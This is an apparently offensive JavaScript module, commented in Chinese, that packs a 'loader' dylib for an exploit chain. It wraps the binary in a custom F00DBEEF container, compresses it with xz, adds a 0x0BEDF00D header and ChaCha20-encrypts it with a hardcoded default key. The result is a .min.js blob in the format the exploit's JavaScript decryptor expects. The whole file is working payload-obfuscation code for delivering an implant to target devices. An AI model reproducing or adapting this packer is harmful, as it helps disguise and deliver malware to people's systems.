/**
 * Loader Pack — F00DBEEF + LZMA + ChaCha20 加密管线
 *
 * 加密流程：dylib → F00DBEEF 容器 → LZMA(xz) 压缩 → 0x0BEDF00D header → ChaCha20 加密
 * 输出格式与 exploit JS 解密器期望一致。
 */
import { execFile } from 'node:child_process';
import { writeFile, readFile, unlink, mkdtemp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { promisify } from 'node:util';
import { chacha20Encrypt } from './chacha20.js';
const execFileAsync = promisify(execFile);
const DEFAULT_KEY = '85ab5908ceb1981df3449b52155a5026561c51d6f9f599acc99c5203b14733eb';
/**
 * 构建 F00DBEEF 容器
 */
function buildContainer(dylibData) {
    const headerSize = 8;
    const entryTableSize = 16;
    const totalSize = headerSize + entryTableSize + dylibData.length;
    const container = Buffer.alloc(totalSize);
    // Magic: 0xF00DBEEF (LE)
    container.writeUInt32LE(0xF00DBEEF, 0);
    // entry_count: 1
    container.writeUInt32LE(1, 4);
    // Entry: type=0x01, field2=3, offset=24, size=dylib.length
    container.writeUInt32LE(0x00010000, 8);
    container.writeUInt32LE(3, 12);
    container.writeUInt32LE(24, 16);
    container.writeUInt32LE(dylibData.length, 20);
    // Data
    dylibData.copy(container, 24);
    return container;
}
/**
 * LZMA 压缩（调用系统 xz）
 */
async function lzmaCompress(data) {
    const dir = await mkdtemp(path.join(tmpdir(), 'loader-pack-'));
    const inputPath = path.join(dir, 'input.bin');
    const outputPath = inputPath + '.xz';
    try {
        await writeFile(inputPath, data);
        await execFileAsync('xz', ['--format=xz', '--check=crc64', '-z', inputPath]);
        return await readFile(outputPath);
    }
    finally {
        await unlink(inputPath).catch(() => { });
        await unlink(outputPath).catch(() => { });
        await unlink(dir).catch(() => { });
    }
}
/**
 * 加密 Loader dylib 为 .min.js 格式
 *
 * @param dylibData 原始或 patched 后的 loader dylib Buffer
 * @param key 64 字符 hex 密钥（默认使用内置密钥）
 */
export async function packLoader(dylibData, key) {
    const keyHex = key || DEFAULT_KEY;
    const keyBytes = Buffer.from(keyHex, 'hex');
    // 1. F00DBEEF 容器
    const container = buildContainer(dylibData);
    // 2. LZMA 压缩
    const compressed = await lzmaCompress(container);
    // 3. 自定义 header: magic(4) + decompressed_size(4) + xz_data
    const header = Buffer.alloc(8);
    header.writeUInt32LE(0x0BEDF00D, 0);
    header.writeUInt32LE(container.length, 4);
    const withHeader = Buffer.concat([header, compressed]);
    // 4. ChaCha20 加密
    return chacha20Encrypt(withHeader, keyBytes);
}
//# sourceMappingURL=loader-pack.js.map